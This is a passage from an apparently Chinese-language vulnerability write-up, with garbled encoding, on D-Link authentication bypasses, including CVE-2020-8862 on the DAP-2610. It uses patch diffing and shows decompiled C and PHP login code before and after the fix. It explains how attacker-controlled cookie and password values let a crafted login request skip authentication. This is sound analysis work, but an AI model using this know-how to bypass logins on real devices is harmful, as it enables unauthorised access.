class="number">3</span>;</span><br><span class="line">  iVar1 = <span class="number">0</span>;</span><br><span class="line">LAB_0001794c:</span><br><span class="line">  print_hnap_result(uVar2);</span><br><span class="line">  <span class="keyword">return</span> iVar1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å‚è€ƒå¦ä¸€ç¯‡åˆ†ææ–‡ç« ï¼š <a href="https://wzt.ac.cn/2021/01/17/DCS-960L/">https://wzt.ac.cn/2021/01/17/DCS-960L/</a></p>
<p>æœ¬æ¼æ´æˆå› å’Œ ZDI-CAN-11352 ç›¸åŒï¼Œæ·»åŠ æ³¨é‡Šçš„ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> ( v44[<span class="number">51</span>] != <span class="number">1</span></span><br><span class="line">          || (getElementValue(a1, <span class="string">&quot;Captcha&quot;</span>, &amp;v29), !<span class="built_in">strcmp</span>(&amp;v47[<span class="number">10</span>] + <span class="number">1</span>, v29))</span><br><span class="line">          || (print_hnap_result(<span class="number">3</span>), v9 = getenv(<span class="string">&quot;Cookie&quot;</span>), splite_cookie(v9, &amp;v47[<span class="number">17</span>]), removeLoginInfo(v47) == <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( getElementValue(a1, <span class="string">&quot;LoginPassword&quot;</span>, &amp;v28) &lt; <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">return</span> v6;</span><br><span class="line">          <span class="built_in">memset</span>(v46, <span class="number">0</span>, <span class="number">85</span>);</span><br><span class="line">          <span class="built_in">sprintf</span>(v46, <span class="string">&quot;%s%s&quot;</span>, &amp;v47[<span class="number">19</span>] + <span class="number">3</span>, &amp;v45[<span class="number">17</span>]);<span class="comment">// key = public key + cookie</span></span><br><span class="line">          v36 = <span class="number">0</span>;</span><br><span class="line">          v37 = <span class="number">0</span>;</span><br><span class="line">          v38 = <span class="number">0</span>;</span><br><span class="line">          v35 = <span class="number">0</span>;</span><br><span class="line">          v10 = <span class="built_in">strlen</span>(&amp;v47[<span class="number">11</span>] + <span class="number">3</span>);</span><br><span class="line">          v11 = <span class="built_in">strlen</span>(v46);</span><br><span class="line">          hmac_md5(&amp;v47[<span class="number">11</span>] + <span class="number">3</span>, v10, v46, v11, &amp;v35);<span class="comment">// private_key = hmac_md5(challenge, chalenge_len, key, key_len)</span></span><br><span class="line">          v12 = htonl(v35);</span><br><span class="line">          v13 = htonl(v36);</span><br><span class="line">          v15 = htonl(v37);</span><br><span class="line">          v14 = htonl(v38);</span><br><span class="line">          <span class="built_in">sprintf</span>(&amp;v47[<span class="number">25</span>], <span class="string">&quot;%08X%08X%08X%08X&quot;</span>, v12, v13, v15, v14);</span><br><span class="line">          v36 = <span class="number">0</span>;</span><br><span class="line">          v37 = <span class="number">0</span>;</span><br><span class="line">          v38 = <span class="number">0</span>;</span><br><span class="line">          v35 = <span class="number">0</span>;</span><br><span class="line">          v17 = <span class="built_in">strlen</span>(&amp;v47[<span class="number">11</span>] + <span class="number">3</span>);</span><br><span class="line">          v16 = <span class="built_in">strlen</span>(&amp;v47[<span class="number">25</span>]);</span><br><span class="line">          hmac_md5(&amp;v47[<span class="number">11</span>] + <span class="number">3</span>, v17, &amp;v47[<span class="number">25</span>], v16, &amp;v35);<span class="comment">// login_password = hmac_md5(challenge, chalenge_len, private_key, private_key_len)</span></span><br><span class="line">          <span class="built_in">memset</span>(v43, <span class="number">0</span>, <span class="number">33</span>);</span><br><span class="line">          v18 = htonl(v35);</span><br><span class="line">          v19 = htonl(v36);</span><br><span class="line">          v21 = htonl(v37);</span><br><span class="line">          v20 = htonl(v38);</span><br><span class="line">          <span class="built_in">sprintf</span>(v43, <span class="string">&quot;%08X%08X%08X%08X&quot;</span>, v18, v19, v21, v20);</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v28, v43)                 <span class="comment">// strcmp(given_login_password, login_password)</span></span><br><span class="line">            || (HIBYTE(v47[<span class="number">10</span>]) = v45[<span class="number">0</span>], time(&amp;v25), v47[<span class="number">35</span>] = v25, v6 = setLoginInfo(v47), v22 = <span class="number">4</span>, v6 != <span class="number">1</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            print_hnap_result(<span class="number">3</span>);</span><br><span class="line">            <span class="keyword">return</span> removeLoginInfo(v47);</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_24:</span><br><span class="line">          print_hnap_result(v22);</span><br><span class="line">          <span class="keyword">return</span> v6;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>éªŒè¯å¯†ç çš„æ—¶å€™ä¼šè·å– cookie ä¸­çš„æŸä¸ªå­—æ®µï¼Œç„¶åæŒ‰ç…§ä»¥ä¸‹ç®—æ³•</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">key = public key + cookie</span><br><span class="line">private_key = hmac_md5(challenge, chalenge_len, key, key_len)</span><br><span class="line">login_password = hmac_md5(challenge, chalenge_len, private_key, private_key_len)</span><br></pre></td></tr></table></figure></div>

<p>è®¡ç®—å¾—åˆ° login_passwordã€‚é™æ€åˆ†ææ¥çœ‹ï¼Œcookie å’Œ LoginPassword å‚æ•°éƒ½æ˜¯ç”¨æˆ·ä»å¤–éƒ¨ä¼ é€’çš„ï¼Œè¿™æ ·å°±èƒ½æ§åˆ¶æœ€åè®¡ç®—å¾—åˆ°çš„ login_password ç»“æœï¼Œå¯ä»¥æ„é€ ç‰¹æ®Šçš„ç™»å½•è¯·æ±‚æ¥ç»•è¿‡ç™»å½•ã€‚</p>
<p>æ–°ç‰ˆæœ¬ä¸­ä»£ç ç‰‡æ®µå¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v43[<span class="number">51</span>] != <span class="number">1</span></span><br><span class="line">  || (getElementValue(a1, <span class="string">&quot;Captcha&quot;</span>, &amp;v28), !<span class="built_in">strcmp</span>(&amp;v46[<span class="number">10</span>] + <span class="number">1</span>, v28))</span><br><span class="line">  || (print_hnap_result(<span class="number">3</span>), v14 = getenv(<span class="string">&quot;Cookie&quot;</span>), splite_cookie(v14, &amp;v46[<span class="number">17</span>]), removeLoginInfo(v46) == <span class="number">1</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( getElementValue(a1, <span class="string">&quot;LoginPassword&quot;</span>, &amp;v27) &lt; <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> v12;</span><br><span class="line">  v35 = <span class="number">0</span>;</span><br><span class="line">  v36 = <span class="number">0</span>;</span><br><span class="line">  v37 = <span class="number">0</span>;</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="built_in">strlen</span>(&amp;v46[<span class="number">11</span>] + <span class="number">3</span>);</span><br><span class="line">  v16 = <span class="built_in">strlen</span>(&amp;v46[<span class="number">25</span>]);</span><br><span class="line">  hmac_md5(&amp;v46[<span class="number">11</span>] + <span class="number">3</span>, v15, &amp;v46[<span class="number">25</span>], v16, &amp;v34);</span><br><span class="line">  <span class="built_in">memset</span>(v42, <span class="number">0</span>, <span class="number">33</span>);</span><br><span class="line">  v17 = htonl(v34);</span><br><span class="line">  v18 = htonl(v35);</span><br><span class="line">  v20 = htonl(v36);</span><br><span class="line">  v19 = htonl(v37);</span><br><span class="line">  <span class="built_in">sprintf</span>(v42, <span class="string">&quot;%08X%08X%08X%08X&quot;</span>, v17, v18, v20, v19);</span><br></pre></td></tr></table></figure></div>

<p>hmac_md5 çš„ key è¢«è®¾ç½®æˆ &amp;v46[25]ï¼Œè§‚å¯Ÿ setLoginInfo å‡½æ•°ç‰‡æ®µ</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        v2(&amp;v13[<span class="number">900</span>], <span class="string">&quot;PrivateKey&quot;</span>);</span><br><span class="line">        v4 = &amp;v13[<span class="number">950</span>];</span><br><span class="line">        v5 = v46 + <span class="number">100</span>;</span><br><span class="line">LABEL_10:</span><br><span class="line">        <span class="built_in">strcpy</span>(v4, v5);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br></pre></td></tr></table></figure></div>

<p>v46 + 100 è½¬æ¢æˆç´¢å¼•å½¢å¼å°±æ˜¯ v46[25]ï¼Œå®ƒè¢«å®šä¹‰æˆ PrivateKeyã€‚å†æ¥çœ‹ getLoginInfo ç‰‡æ®µ</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> ( strcasecmp(v4 + v8 + <span class="number">8</span>, <span class="string">&quot;PrivateKey&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( strcasecmp(v4 + v8 + <span class="number">8</span>, <span class="string">&quot;TimeStamp&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !strcasecmp(v4 + v8 + <span class="number">8</span>, <span class="string">&quot;QueryTime&quot;</span>) )</span><br><span class="line">              *(a2 + <span class="number">140</span>) = atol(v4 + <span class="number">150</span> * i + <span class="number">58</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            *(a2 + <span class="number">136</span>) = atol(v4 + <span class="number">150</span> * i + <span class="number">58</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">        &#125;</span><br><span class="line">        v6 = v4 + v8 + <span class="number">58</span>;</span><br><span class="line">        v7 = a2 + <span class="number">100</span>;</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">strcpy</span>(v7, v6);</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­ V7 å°±æ˜¯ä¸Šè¿°çš„  v46[25]ï¼Œå¾ˆæ˜æ˜¾ï¼Œç”¨æˆ·ä¿¡æ¯ä¸­æœ¬æ¥å°±é»˜è®¤ä¿å­˜äº† private key è¿™ä¸ªå€¼ï¼Œä½†æ˜¯æ—§ç‰ˆæœ¬ä¸­è¦å…ˆè°ƒç”¨ hmac_md5 è®¡ç®—å¾—åˆ° private keyï¼Œè€Œä¸”è®¡ç®—è¿‡ç¨‹ä¸­å¸¦å…¥äº†æ”»å‡»è€…å¯æ§çš„æ•°æ®ï¼Œè¿™æ ·ä¼šå¯¼è‡´éªŒè¯ç»•è¿‡ã€‚</p>
<p>æ–°ç‰ˆæœ¬ä¸­å–æ¶ˆäº†åŠ¨æ€è®¡ç®— private_key çš„è¿‡ç¨‹ï¼Œç›´æ¥ä»å·²ç»ä¿å­˜çš„ç”¨æˆ·ä¿¡æ¯ä¸­è·å–ï¼Œå¹¶ä¸”åœ¨ check_login_addr å‡½æ•°ä¸­æ£€æŸ¥äº† getLoginInfo  çš„è¿”å›å€¼ã€‚</p>
<h1 id="CVE-2020-8862"><a href="#CVE-2020-8862" class="headerlink" title="CVE-2020-8862"></a>CVE-2020-8862</h1><p> 2020å¹´2æœˆ21æ—¥ï¼ŒZDI å›¢é˜ŸæŠ«éœ²äº†åœ¨ Dlink DAP-2610 è·¯ç”±å™¨ä¸­å­˜åœ¨èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ï¼Œæ¼æ´æˆå› æ˜¯åœ¨å¤„ç†ç™»å½•è¯·æ±‚çš„æ—¶å€™å¯¹äº password å¤„ç†ä¸æ°å½“ã€‚</p>
<h2 id="æ¼æ´åˆ†æ-2"><a href="#æ¼æ´åˆ†æ-2" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æ­¤è®¾å¤‡ä½¿ç”¨ php å®ç° web ç«¯ç›¸å…³é€»è¾‘ï¼Œæˆ‘ä»¬é‡‡ç”¨è¡¥ä¸å¯¹æ¯”çš„ç­–ç•¥è¿›è¡Œæ¼æ´å®šä½ã€‚</p>
<p>é¦–å…ˆæ ¹æ®æŠ«éœ²ä¿¡æ¯å¯ä»¥å¾—çŸ¥ï¼Œæ¼æ´å‡ºç°åœ¨å¤„ç† password çš„é€»è¾‘ä¸­ï¼Œé‚£ä¹ˆé¦–å…ˆæœç´¢ login å­—ç¬¦ä¸²ï¼ŒæŸ¥æ‰¾å’Œç™»å½•æœ‰å…³çš„ä»£ç ï¼Œè¿™é‡Œæˆ‘åœ¨ web ç›®å½•ä¸‹æ‰¾åˆ°äº† login.php å’Œ __login.phpï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶ä¼¼ä¹å’Œç™»å½•é€»è¾‘ç›¸å…³ã€‚æ‘˜æŠ„ç›¸å…³ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="comment">/* vi: set sw=4 ts=4: */</span></span><br><span class="line"><span class="comment">//echo &quot;Username[&quot;.$LOGIN_USER.&quot;], Password[&quot;.$LOGIN_PASSWD.&quot;]\n&quot;;</span></span><br><span class="line"><span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;401&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$authnum</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$max_authnum</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/proc/web/authnum&quot;</span>);</span><br><span class="line"><span class="variable">$max_session</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/proc/web/sessionum&quot;</span>);</span><br><span class="line"><span class="variable">$cfg_radiusclient_enable</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/wlan/inf:1/radiusclient_enable&quot;</span>);</span><br><span class="line"><span class="variable">$index</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$index</span>&lt;=<span class="variable">$max_session</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">fread</span>(<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$index</span>.<span class="string">&quot;/user/ac_auth&quot;</span>)==<span class="string">&quot;1&quot;</span>)&#123;<span class="variable">$authnum</span>++;&#125;</span><br><span class="line">	<span class="variable">$index</span>++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ac_auth</span>=<span class="title function_ invoke__">fread</span>(<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$sid</span>.<span class="string">&quot;/user/ac_auth&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$authnum</span>&gt;=<span class="variable">$max_authnum</span> &amp;&amp; <span class="variable">$ac_auth</span>!=<span class="string">&quot;1&quot;</span>)&#123;<span class="variable">$full</span>=<span class="string">&quot;1&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$full</span>==<span class="string">&quot;1&quot;</span> || <span class="variable">$sid</span>==<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;full&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$match</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$LOGIN_USER</span>!=<span class="string">&quot;&quot;</span>)<span class="comment">// &amp;&amp; $password!=&quot;&quot;)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// check the user name and password.</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$cfg_radiusclient_enable</span>!=<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="string">&quot;/sys/user&quot;</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="variable">$match</span>==<span class="string">&quot;&quot;</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$user_d</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$ac_auth</span> == <span class="string">&quot;1&quot;</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="variable">$match</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$LOGIN_USER</span> == <span class="variable">$user_d</span> &amp;&amp; <span class="variable">$ac_auth</span> != <span class="string">&quot;1&quot;</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="variable">$prefix</span>=<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$sid</span>.<span class="string">&quot;/user&quot;</span>;</span><br><span class="line">						<span class="variable">$hmac_md5_path</span> = <span class="string">&quot;/var/proc/web/hmac_md5/&quot;</span>.<span class="variable">$session_uid</span>;</span><br><span class="line">						<span class="variable">$password_noenc</span> = <span class="title function_ invoke__">query</span>(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">						<span class="variable">$acc_per</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;acc_per&quot;</span>);</span><br><span class="line">						<span class="variable">$password_d</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/password_md5&quot;</span>);</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$LOGIN_PASSWD</span> == <span class="variable">$password_d</span>)</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="variable">$match</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">							<span class="variable">$group</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;group&quot;</span>);</span><br><span class="line">							<span class="variable">$private_key</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/private_key&quot;</span>);</span><br><span class="line">							<span class="variable">$password_md5</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/password_md5&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/id&quot;</span>,<span class="variable">$sid</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/name&quot;</span>,     <span class="variable">$LOGIN_USER</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/pass&quot;</span>,     <span class="variable">$password_noenc</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/group&quot;</span>,    <span class="variable">$group</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/ac_auth&quot;</span>,  <span class="string">&quot;1&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/acc_per&quot;</span>,	<span class="variable">$acc_per</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/private_key&quot;</span>,	<span class="variable">$private_key</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/password_md5&quot;</span>,	<span class="variable">$password_md5</span>);</span><br><span class="line">							<span class="comment">//login access delete hamc</span></span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/private_key&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/password_md5&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/challenge&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/public_key&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/time&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/session_uid&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							<span class="variable">$match</span>=<span class="string">&quot;-1&quot;</span>;</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/ac_auth&quot;</span>);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="title function_ invoke__">set</span>(<span class="string">&quot;/wlan/inf:1/radiusclient_username&quot;</span>,<span class="variable">$LOGIN_USER</span>);</span><br><span class="line">			<span class="title function_ invoke__">set</span>(<span class="string">&quot;/wlan/inf:1/radiusclient_password&quot;</span>,<span class="variable">$LOGIN_PASSWD</span>);</span><br><span class="line">			<span class="title function_ invoke__">set</span>(<span class="string">&quot;/runtime/web/sub_str&quot;</span>,<span class="string">&quot;RADIUSCLIENT&quot;</span>);</span><br><span class="line">			<span class="variable">$user_d</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/sys/user:1/name&quot;</span>);</span><br><span class="line">			<span class="variable">$password_d</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/sys/user:1/password&quot;</span>);</span><br><span class="line">			<span class="variable">$group</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/sys/user:1/group&quot;</span>);</span><br><span class="line">			<span class="variable">$prefix</span>=<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$sid</span>.<span class="string">&quot;/user&quot;</span>;</span><br><span class="line">			<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/name&quot;</span>,     <span class="variable">$user_d</span>);</span><br><span class="line">			<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/group&quot;</span>,    <span class="variable">$group</span>);</span><br><span class="line">			<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/ac_auth&quot;</span>,  <span class="string">&quot;1&quot;</span>);</span><br><span class="line">			<span class="variable">$match</span>=<span class="string">&quot;-1&quot;</span>;</span><br><span class="line">			<span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;radiusclient&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$match</span>==<span class="string">&quot;1&quot;</span>)	&#123;<span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>ä¸Šé¢æ˜¯ __login.php çš„ä»£ç ï¼Œä»æ³¨é‡Šå’Œé€»è¾‘ä¸Šå¤§è‡´åˆ†æä¸€ä¸‹å¯ä»¥ç¡®å®šè¿™é‡Œå°±æ˜¯ç”¨äºéªŒè¯ç™»å½•ä¿¡æ¯çš„ä½ç½®ï¼Œå†æ¥çœ‹çœ‹ä¿®å¤è¿‡çš„ä»£ç ï¼š</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="comment">/* vi: set sw=4 ts=4: */</span></span><br><span class="line"><span class="comment">//echo &quot;Username[&quot;.$LOGIN_USER.&quot;], Password[&quot;.$LOGIN_PASSWD.&quot;]\n&quot;;</span></span><br><span class="line"><span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;401&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$authnum</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$max_authnum</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/proc/web/authnum&quot;</span>);</span><br><span class="line"><span class="variable">$max_session</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/proc/web/sessionum&quot;</span>);</span><br><span class="line"><span class="variable">$cfg_radiusclient_enable</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/wlan/inf:1/radiusclient_enable&quot;</span>);</span><br><span class="line"><span class="variable">$index</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$index</span>&lt;=<span class="variable">$max_session</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">fread</span>(<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$index</span>.<span class="string">&quot;/user/ac_auth&quot;</span>)==<span class="string">&quot;1&quot;</span>)&#123;<span class="variable">$authnum</span>++;&#125;</span><br><span class="line">	<span class="variable">$index</span>++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ac_auth</span>=<span class="title function_ invoke__">fread</span>(<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$sid</span>.<span class="string">&quot;/user/ac_auth&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$authnum</span>&gt;=<span class="variable">$max_authnum</span> &amp;&amp; <span class="variable">$ac_auth</span>!=<span class="string">&quot;1&quot;</span>)&#123;<span class="variable">$full</span>=<span class="string">&quot;1&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$full</span>==<span class="string">&quot;1&quot;</span> || <span class="variable">$sid</span>==<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;full&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$match</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$LOGIN_USER</span>!=<span class="string">&quot;&quot;</span>)<span class="comment">// &amp;&amp; $password!=&quot;&quot;)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// check the user name and password.</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$cfg_radiusclient_enable</span>!=<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="string">&quot;/sys/user&quot;</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="variable">$match</span>==<span class="string">&quot;&quot;</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$user_d</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$ac_auth</span> == <span class="string">&quot;1&quot;</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="variable">$match</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$LOGIN_USER</span> == <span class="variable">$user_d</span> &amp;&amp; <span class="variable">$ac_auth</span> != <span class="string">&quot;1&quot;</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="variable">$prefix</span>=<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$sid</span>.<span class="string">&quot;/user&quot;</span>;</span><br><span class="line">						<span class="variable">$hmac_md5_path</span> = <span class="string">&quot;/var/proc/web/hmac_md5/&quot;</span>.<span class="variable">$session_uid</span>;</span><br><span class="line">						<span class="variable">$password_noenc</span> = <span class="title function_ invoke__">query</span>(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">						<span class="variable">$acc_per</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;acc_per&quot;</span>);</span><br><span class="line">						<span class="variable">$password_d</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/password_md5&quot;</span>);</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$password_d</span> != <span class="string">&quot;&quot;</span> &amp;&amp; <span class="variable">$LOGIN_PASSWD</span> == <span class="variable">$password_d</span>)</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="variable">$match</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">							<span class="variable">$group</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;group&quot;</span>);</span><br><span class="line">							<span class="variable">$private_key</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/private_key&quot;</span>);</span><br><span class="line">							<span class="variable">$password_md5</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/password_md5&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/id&quot;</span>,<span class="variable">$sid</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/name&quot;</span>,     <span 